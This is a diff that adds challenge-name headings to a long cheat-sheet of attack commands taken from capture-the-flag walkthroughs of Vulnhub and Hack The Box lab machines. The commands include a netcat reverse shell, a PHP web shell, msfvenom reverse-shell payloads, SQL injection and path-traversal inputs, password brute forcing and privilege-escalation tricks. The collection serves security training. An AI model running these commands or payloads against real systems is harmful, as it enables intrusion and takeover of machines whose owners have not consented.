@@ -5246,7 +5817,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Symfonos1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/symfonos1-vulnhub-walkthrough/
+
 nmap -A 192.168.0.16
 enum4linux 192.168.0.16
 wpscan --url http://symfonos.local/h3l105/ --enumerate p
@@ -5270,7 +5844,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Hackme 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/hackme-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.108
 sqlmap -r sql.txt --dbs --batch
@@ -5285,7 +5862,10 @@ id
 
 
 
+
+Challenge Name: Spjerome Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/spjerome-vulnhub-walkthrough/
+
 netdiscover
 nmap –A 192.168.1.104
 wpscan --url http://127.0.0.1:1337/wordpress --proxy http://192.168.1.104:8080 -e u
@@ -5313,7 +5893,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Domdom 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/domdom-1-vulnhub-walkthrough/
+
 nmap -A 192.168.1.35
 dirb http://192.168.1.35
 nc -lvp 1234
@@ -5327,7 +5910,10 @@ su root
 
 
 
+
+Challenge Name: Zeus1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/zeus1-vulnhub-walkthrough/
+
 nmap -A 192.168.131.170
 ssh gogu@192.168.131.170
 id
@@ -5354,7 +5940,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Minu V2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/minu-v2-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.101
 dirb http://192.168.1.101/3306 -X .html
@@ -5370,7 +5959,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Minu 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-minu-1-ctf-challenge/
+
 nmap –A 192.168.1.108
 dirb http://192.168.1.108/ -X .php
 wafw00f http://192.168.1.108
@@ -5399,7 +5991,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Digitalworld Local Joy Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/digitalworld-local-joy-vulnhub-walkthrough/
+
 nmap -A 192.168.1.104
 ftp 192.168.1.104
 ls
@@ -5426,7 +6021,10 @@ author-secret.txt
 
 
 
+
+Challenge Name: Beast 2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/beast-2-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.102
 ip.addr==192.168.1.102 && udp
 ssh whitepointer@192.168.1.102 -p 65022
@@ -5441,7 +6039,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Box Friendzone Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
+
 nmap -sC -sV 10.10.10.123
 smbmap -H 10.10.10.123
 smbmap //10.10.10.123/general
@@ -5458,7 +6059,10 @@ echo "system ('cat /root/root.txt > /tmp/flag')" >> /usr/lib/python2.7/os.py
 
 
 
+
+Challenge Name: Matrix 3 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/matrix-3-vulnhub-walkthrough/
+
 nmap –p- –A 192.168.1.104
 dirb http://192.168.1.104
 file secret.gz
@@ -5485,7 +6089,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Matrix 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/matrix-1-vulnhub-walkthrough/
+
 netdiscover
 crunch 8 8 -t k1ll0r%@ -o dict.txt
 hydra -l guest -P dict.txt 192.168.1.18 ssh
@@ -5507,7 +6114,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Escalate_Linux Vulnhub Walkthrough Part 1
 Challenge URL: https://www.hackingarticles.in/escalate_linux-vulnhub-walkthrough-part-1/
+
 nmap -A 192.168.0.17
 dirb http://192.168.0.17/ –X .php
 use exploit/multi/script/web_delivery
@@ -5559,7 +6169,10 @@ id
 
 
 
+
+Challenge Name: Hack The Box Netmon Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-netmon-walkthrough/
+
 nmap -A 10.10.10.152
 ftp 10.10.10.152
 ls -la
@@ -5587,7 +6200,10 @@ type root.txt
 
 
 
+
+Challenge Name: Mission Pumpkin V1 0 Pumpkinfestival Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/mission-pumpkin-v1-0-pumpkinfestival-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.101
 ftp 192.168.1.101
 cd secret
@@ -5634,7 +6250,10 @@ cat PumpkinFestival_Ticket
 
 
 
+
+Challenge Name: Pumpkinraising Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/pumpkinraising-vulnhub-walkthrough/
+
 nmap -A 192.168.0.11
 http://192.168.0.11/hidden/notes.txt
 Robert: C@43r0VqG2=
@@ -5652,7 +6271,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Pumpkingarden Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/pumpkingarden-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.0.14
 ls
 get note.txt
@@ -5667,7 +6289,10 @@ cat 38362.sh
 
 
 
+
+Challenge Name: Hack The Box Help Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-help-walkthrough/
+
 nmap -A 10.10.10.121
 dirb http://10.10.10.121
 php –a
@@ -5686,7 +6311,10 @@ cd /root
 
 
 
+
+Challenge Name: Happycorp1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/happycorp1-vulnhub-walkthrough/
+
 nmap -A 192.168.1.104
 showmount -e 192.168.1.104
 mkdir /tmp/raj
@@ -5713,7 +6341,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Lightweight Hack The Box Walkthrough
 Challenge URL: https://www.hackingarticles.in/lightweight-hack-the-box-walkthrough/
+
 nmap -A 10.10.10.119
 nmap -Pn -p 389 --script ldap-search 10.10.10.119
 ssh 10.10.14.10@10.10.10.119
@@ -5729,7 +6360,10 @@ getcap -r / 2>/dev/null
 
 
 
+
+Challenge Name: Digitalworld Local Bravery Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/digitalworld-local-bravery-vulnhub-walkthrough/
+
 nmap -A 192.168.1.105
 showmount -e 192.168.1.105
 mkdir /tmp/raj
@@ -5763,7 +6397,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Unknowndevice64 V2 0 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/unknowndevice64-v2-0-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.22
 chmod 600 sshkey
@@ -5777,7 +6414,10 @@ cat system/flag.txt
 
 
 
+
+Challenge Name: Sputnik 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sputnik-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.103
 git clone https://github.com/ameerpornillos/flappy
@@ -5797,7 +6437,10 @@ sudo ed
 
 
 
+
+Challenge Name: Development Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/development-vulnhub-walkthrough/
+
 netdiscover
 nmap -sV 192.168.1.104
 ssh intern@192.168.1.104
@@ -5818,7 +6461,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Born2Root 2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/born2root-2-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.9
 dirb http://192.168.1.9/
@@ -5843,7 +6489,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Dc8 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dc8-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.6
 sqlmap -u 192.168.0.6/?nid=2 --dbs --batch --risk 3 --level 5
@@ -5865,7 +6514,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Dc7 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dc7-vulnhub-walkthrough/
+
 nmap -A 192.168.1.101
 Username: dc7user
 Password: MdR3xOgB7#dW
@@ -5878,7 +6530,10 @@ mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; r
 
 
 
+
+Challenge Name: Dc 5 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dc-5-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.108
 <?php system($_GET['cmd']) ?>
@@ -5902,7 +6557,10 @@ cat thisistheflag.txt
 
 
 
+
+Challenge Name: Dc 4 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dc-4-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.101
 hydra -L users -P passwords 192.168.1.101 ssh
@@ -5924,7 +6582,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Dc 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dc-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -sV 192.168.1.104
 msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
@@ -5938,7 +6599,10 @@ find raj -exec "/bin/sh" \;
 
 
 
+
+Challenge Name: Hack The Box Irked Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-irked-walkthrough/
+
 nmap -p- -sV 10.10.10.117 --open
 use exploit/unix/irc/unreal_ircd_3281_backdoor
 msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 10.10.10.117
@@ -5959,7 +6623,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Teacher Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-teacher-walkthrough/
+
 nmap -sC -sV -p- 10.10.10.153
 dirb //10.10.10.153
 wget //10.10.10.153/images/5.png
@@ -5987,7 +6654,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Vault Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-vault-walkthrough/
+
 nmap -p- -sV -sC 10.10.10.109
 dirb //10.10.10.109/sparklays/ -w
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.13.234 lport=1234 -f raw > shell.php5
@@ -6028,7 +6698,10 @@ gpg -d root.txt.gpg
 
 
 
+
+Challenge Name: Hack The Box Curling Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-curling-walkthrough/
+
 nmap -sV -sC -T4 -p- 10.10.10.150
 echo "Q3VybGluZzIwMTgh" | base64 -d
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.120 lport=443 -f raw
@@ -6069,7 +6742,10 @@ cat report
 
 
 
+
+Challenge Name: Hack The Box Frolic Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-frolic-walkthrough/
+
 nmap -sV 10.10.10.111
 dirb http://10.10.10.111:9999/
 base64 -d code > encodedfile
@@ -6101,7 +6777,10 @@ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 
 
 
+
+Challenge Name: Hack The Box Carrier Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-carrier-walkthrough/
+
 nmap -sC -sV -p-  -T4 10.10.10.105
 nmap -sU --min-rate=5000 -T4 10.10.10.105
 snmpwalk -c public -v 1 10.10.10.105
@@ -6130,7 +6809,10 @@ ssh root@10.10.10.105
 
 
 
+
+Challenge Name: Casino Royale 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/casino-royale-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -sV -p- 192.168.1.102
 dirb http://192.168.1.102/
@@ -6177,7 +6859,10 @@ cat flag.sh
 
 
 
+
+Challenge Name: Hack The Box Access Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-access-walkthrough/
+
 nmap -p- -A 10.10.10.98
 ftp 10.10.10.98
 strings backup.mdb | grep access
@@ -6217,7 +6902,10 @@ type root.txt
 
 
 
+
+Challenge Name: Hack The Box Zipper Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-zipper-walkthrough/
+
 nmap -A 10.10.10.108
 gobuster -s '200,204,301,302,307,403,500' -e -t 20 -u http://10.10.10.100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
 zabbix-cli
@@ -6243,7 +6931,10 @@ utils/zabbix-service
 
 
 
+
+Challenge Name: Hack The Box Giddy Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-giddy-walkthrough/
+
 nmap -sV -sC 10.10.10.104
 dirb https://10.10.10.104 /usr/share/wordlists/dirb/big.txt
 impacket-smbserver hack $(pwd)
@@ -6263,7 +6954,10 @@ msf5 exploit(multi/handler) > run
 
 
 
+
+Challenge Name: Hack The Box Dab Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-dab-walkthrough/
+
 nmap -sV -sC 10.10.10.86
 steghide --info dab.jpg
 steghide extract -sf dab.jpg -xf dab.txt
@@ -6282,7 +6976,10 @@ myexec
 
 
 
+
+Challenge Name: Hack The Box Ypuffy Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-ypuffy-walkthrough/
+
 nmap -sV -sC 10.10.10.107
 nmap -p389 --script=ldap-search 10.10.10.107
 smbclient –L \\\\10.10.10.107\\ -U alice1978%<hash> --pw-nt-hash
@@ -6301,7 +6998,10 @@ ssh -i /tmp/id_rsa root@localhost
 
 
 
+
+Challenge Name: Hack The Box Secnotes Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-secnotes-walkthrough/
+
 nmap -p- -sV 10.10.10.97
 Username: ' or 1='1
 Password: ' or 1='1
@@ -6343,7 +7043,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Fighter Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-fighter-walkthrough/
+
 nmap -sV -sC -T4 10.10.10.72
 dirb http://members.streetfighterclub.htb/
 dirb http://members.streetfighterclub.htb/old -X .asp
@@ -6366,7 +7069,10 @@ download checkdll.dll /root/Desktop
 
 
 
+
+Challenge Name: Hack The Box Mischief Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-mischief-walkthrough/
+
 nmap -A 10.10.10.92
 nmap -sU 10.10.10.92
 nmap -p161 –sC –sV –sU 10.10.10.92
@@ -6385,7 +7091,10 @@ find / -name root.txt
 
 
 
+
+Challenge Name: Hack The Box Nightmare Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-nightmare-walkthrough/
+
 nmap -sC -sV 10.10.10.66
 Username: admin ‘) order by 3#
 Password: pass
@@ -6414,7 +7123,10 @@ chmod +x priv
 
 
 
+
+Challenge Name: Hack The Box Waldo Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-waldo-walkthrough/
+
 nmap -sV -sC -T4 10.10.10.87
 ./….//….//….//….//etc//passwd
 chmod 600 id_rsa
@@ -6430,7 +7142,10 @@ tac /root/root.txt
 
 
 
+
+Challenge Name: Kfiofan1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/kfiofan1-vulnhub-walkthrough/
+
 nmap -A 192.168.1.105
 raj" union select 1,2;#
 raj" union select table_name,column_name from information_schema.columns;#
@@ -6446,7 +7161,10 @@ cat flag4.txt
 
 
 
+
+Challenge Name: Hack The Box Active Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-active-walkthrough/
+
 nmap -sV 10.10.10.100
 ./enum4liux -S 10.10.10.100
 smbclient //10.10.10.100/Replication
@@ -6464,7 +7182,10 @@ msf exploit(windows/smb/psexec) > exploit
 
 
 
+
+Challenge Name: Moonraker1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/moonraker1-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.110 --open
 dirb http://192.168.1.110/
@@ -6488,7 +7209,10 @@ Password: cyberVR00M
 
 
 
+
+Challenge Name: Hack The Box Hawk Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-hawk-walkthrough/
+
 nmap -A 10.10.10.102
 ftp 10.10.10.102
 file .drupal.txt.enc
@@ -6513,7 +7237,10 @@ id
 
 
 
+
+Challenge Name: Typhoon 1 02 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/typhoon-1-02-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.101
 ssh typhoon@192.168.1.101
@@ -6549,7 +7276,10 @@ msf exploit(multi/http/lcms_php_exec) > exploit
 
 
 
+
+Challenge Name: Mercy Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/mercy-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.105
 enum4linux http://192.168.1.105
@@ -6582,7 +7312,10 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 
 
+
+Challenge Name: Fourandsix 2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/fourandsix-2-vulnhub-walkthrough/
+
 nmap -A 192.168.1.103
 showmount -e 192.168.1.103
 mount -t nfs 192.168.1.103:/home/user/storage raj
@@ -6594,7 +7327,10 @@ doas /usr/bin/less /var/log/authlog
 
 
 
+
+Challenge Name: Raven 2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/raven-2-vulnhub-walkthrough/
+
 nmap -A 192.168.1.101
 dirb http://192.168.1.101/
 python –c 'import pty;pty.spawn("/bin/bash")'
@@ -6627,7 +7363,10 @@ cat flag4.txt
 
 
 
+
+Challenge Name: Fowsniff 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A -p- -T4 192.168.1.29
 msf > use auxiliary/scanner/pop3/pop3_login
@@ -6656,7 +7395,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Box Jerry Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-jerry-walkthrough/
+
 nmap -sV 10.10.10.95
 User: tomcat
 Password: s3cret
@@ -6669,7 +7411,10 @@ msf exploit(multi/http/tomcat_mgr_upload) > exploit
 
 
 
+
+Challenge Name: Hack The Raven Walkthrough Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/
+
 nmap -A 192.168.1.102
 wpscan --url http://192.168.1.102/wordpress/ --wp-content-dir -ep -et -eu
 ssh michael@192.168.1.102
@@ -6706,7 +7451,10 @@ id
 
 
 
+
+Challenge Name: Hack The Box Dropzone Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-dropzone-walkthrough/
+
 nmap -sU -T4 10.10.10.90
 tftp 10.10.10.90
 cat boot.ini
@@ -6735,7 +7483,10 @@ streams -accepteula -s .
 
 
 
+
+Challenge Name: Hack The Box Bounty Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-bounty-walkthrough/
+
 nmap –A 10.10.10.93
 msf use exploit/multi/script/web_delivery
 msf exploit(multi/script/web_delivery) set srvhost 10.10.14.2
@@ -6757,7 +7508,10 @@ getuid
 
 
 
+
+Challenge Name: Hack The Box Devoops Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-devoops-walkthrough/
+
 nmap -p- -A 10.10.10.91 --open
 http://10.10.10.91:5000
 dirb http://10.10.10.91:5000
@@ -6793,7 +7547,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Olympus Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-olympus-walkthrough/
+
 nmap -A 10.10.10.83
 nikto -h http://10.10.10.83
 msf > use exploit/unix/http/xdebug_unauth_exec
@@ -6825,7 +7582,10 @@ docker run -v /:/root -i -t olympia /bin/bash
 
 
 
+
+Challenge Name: Hack The Box Sunday Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-sunday-walkthrough/
+
 nmap -p- -A 10.10.10.76 --open
 use auxiliary/scanner/finger/finger_users
 msf auxiliary(scanner/finger/finger_users) > set rhosts 10.10.10.76
@@ -6858,7 +7618,10 @@ nc -lvp 80
 
 
 
+
+Challenge Name: Hack The Gemini Inc2 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-gemini-inc2-ctf-challenge/
+
 nmap –A 192.168.1.103
 dirb http://192.168.1.103 -X .php
 #!/bin/bash
@@ -6898,7 +7661,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Canape Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-canape-walkthrough/
+
 nmap -p- -sV 10.10.10.70
 dirb http://10.10.10.70 -f
 git clone http://git.canape.htb/simpsons.git
@@ -6923,7 +7689,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Rop Primer 1 0 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-rop-primer-1-0-1-ctf-challenge/
+
 netdiscover
 ssh level0@192.168.199.139
 set disassembly-flavor intel
@@ -6964,7 +7733,10 @@ pattern offset 0x41414641
 
 
 
+
+Challenge Name: Hack The Box Fulcrum Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-fulcrum-walkthrough/
+
 nmap -sV -p- 10.10.10.62
 msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw > shell.php
 python -m SimpleHTTPServer 80
@@ -6992,7 +7764,10 @@ nc -lvp 53
 
 
 
+
+Challenge Name: Hack The Box Poison Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-poison-walkthrough/
+
 nmap -A 10.10.10.84
 cat decode | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 –d
 ssh charix@10.10.10.84
@@ -7008,7 +7783,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Stratospherewalkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-stratospherewalkthrough/
+
 nmap -sV 10.10.10.64
 nmap -p8080 --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ 10.10.10.64
 git clone https://github.com/drigg3r/Struts-Apache-ExploitPack.git
@@ -7033,7 +7811,10 @@ sudo /usr/bin/python /home/richard/test.py
 
 
 
+
+Challenge Name: Hack The Box Celestial Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-celestial-walkthrough/
+
 nmap -A 10.10.10.85
 eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
 echo {"username":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(value) )}()"} | base64 -w0
@@ -7059,7 +7840,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Android4 Walkthrough Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-android4-walkthrough-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.105
 use exploit/android/adb/adb_server_exec
@@ -7079,7 +7863,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Box Minion Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-minion-walkthrough/
+
 nmap -sV -p- 10.10.10.57 -–open
 dirb http://10.10.10.57:62696 -X .asp
 tcpdump -i tun0 icmp
@@ -7101,7 +7888,10 @@ invoke-command –Session $session {cd C:\users\administrator\desktop; .\root.ex
 
 
 
+
+Challenge Name: Hack The Ch4Inrulz 1 0 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-ch4inrulz-1-0-1-ctf-challenge/
+
 192.168.1.103:8011/api/files_api.php?file=/etc/passwd
 curl -X POST -d "file=/etc/passwd" http://192.168.1.103:8011/api/files_api.php
 curl –X POST –d "file=/var/www/development/uploader/FRANKuploads/shell.gif" http://192.168.1.103:8011/api/files_api.php
@@ -7123,7 +7913,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Wakanda 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-wakanda-1-ctf-challenge/
+
 netdiscover
 nmap -p- -A 192.168.1.124
 dirb http://192.168.1.124
@@ -7138,7 +7931,10 @@ sudo pip install . --upgrade --force-reinstall
 
 
 
+
+Challenge Name: Hack The Wintermute 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-wintermute-1-ctf-challenge/
+
 nmap -p- -A 192.168.1.124
 http://192.168.1.124/turing-bolo/bolo.php?bolo=case
 http://192.168.1.124/turing-bolo/bolo.php?bolo=../../../log/mail
@@ -7185,7 +7981,10 @@ cat note.txt
 
 
 
+
+Challenge Name: Hack The Lampiao 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-lampiao-1-ctf-challenge/
+
 nmap -p- -A 192.168.1.105
 msf > user explot/unix/webapp/drupal_drupalgeddon2
 msf exploit(unix/webapp/drupal_drupalgeddon2) > set rhost 192.168.1.105
@@ -7200,7 +7999,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Bulldog2 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-bulldog2-ctf-challenge/
+
 nmap –A 192.168.1.120
 tcpdump -nni eth0 icmp
 ; ping 192.168.1.104 -c 4
@@ -7220,7 +8022,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Box Bart Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-bart-walkthrough/
+
 nmap -sV 10.10.10.81
 dirb http://bart.htb/
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f exe > shell.exe
@@ -7256,7 +8061,10 @@ msf auxiliary(admin/smb/psexec_command) > run
 
 
 
+
+Challenge Name: Hack The Box Valentine Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-valentine-walkthrough/
+
 nmap –A 10.10.10.79
 dirb http://10.10.10.79
 sed 's/ //g' key> sshkey
@@ -7281,7 +8089,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Aragog Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-aragog-walkthrough/
+
 nmap -A 10.10.10.78
 ftp 10.10.10.78
 ls
@@ -7335,7 +8146,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Jarbas 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-jarbas-1-ctf-challenge/
+
 nmap -A 192.168.1.122
 dirb http://192.168.1.122/ -X .html
 eder: vipsu
@@ -7383,7 +8197,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Temple Of Doom Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-temple-of-doom-ctf-challenge/
+
 nmap -A 192.168.1.130
 {"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=>{console.log(out);}); }()"}
 id
@@ -7409,7 +8226,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Golden Eye1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-golden-eye1-ctf-challenge/
+
 nmap -p- -A 192.168.1.140 --open
 nmap -Pn -p 55006,55007 -sV 192.168.1.140
 hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3
@@ -7448,7 +8268,10 @@ cat .flag.txt
 
 
 
+
+Challenge Name: Hack The Fourandsix Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-fourandsix-ctf-challenge/
+
 nmap -A 192.168.1.105
 showmount -e 192.168.1.105
 cd /tmp
@@ -7470,7 +8293,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Hack The Blacklight 1 Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-blacklight-1-ctf-challenge/
+
 nmap -p- -A  192.168.1.102 --open
 dirb http://192.168.1.102
 .readhash
@@ -7494,7 +8320,10 @@ cat flag2.txt
 
 
 
+
+Challenge Name: Hack The Basic Pentesting2 Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-basic-pentesting2-vm-ctf-challenge/
+
 nmap -A 192.168.1.139
 enum4linux 192.168.139
 hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.1.139 ssh
@@ -7514,7 +8343,10 @@ ls
 
 
 
+
+Challenge Name: Hack The Toppo1 Vm Ctf Challenges
 Challenge URL: https://www.hackingarticles.in/hack-the-toppo1-vm-ctf-challenges/
+
 nmap -A 192.168.1.104
 dirb http://192.168.1.104
 http://192.168.1.104/admin
@@ -7532,7 +8364,10 @@ cat /root/flag.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Ariekei Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-ariekei-walkthrough/
+
 nmap -sV -p- 10.10.10.65 --open
 dirb https://10.10.10.65/ -w
 dirb https://calvin.ariekei.htb/
@@ -7552,7 +8387,10 @@ docker run -v /:/hack -i -t bash
 
 
 
+
+Challenge Name: Hack The Violator Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-violator-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.104
 use exploit/unix/ftp/proftpd_modcopy_exec
@@ -7604,7 +8442,10 @@ exiftool artwork.jpg
 
 
 
+
+Challenge Name: Hack The Teuchter Vm Ctf Challenge
 Challenge URL: https://www.hackingarticles.in/hack-the-teuchter-vm-ctf-challenge/
+
 netdiscover
 nmap -A 192.168.1.104
 dirb http://192.168.1.104/flicks/ -X .php,.pht
@@ -7678,7 +8519,10 @@ steghide extract -sf glass_ch.jpg -xf /root/Desktop/finalflag.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Enterprises Walkthrough
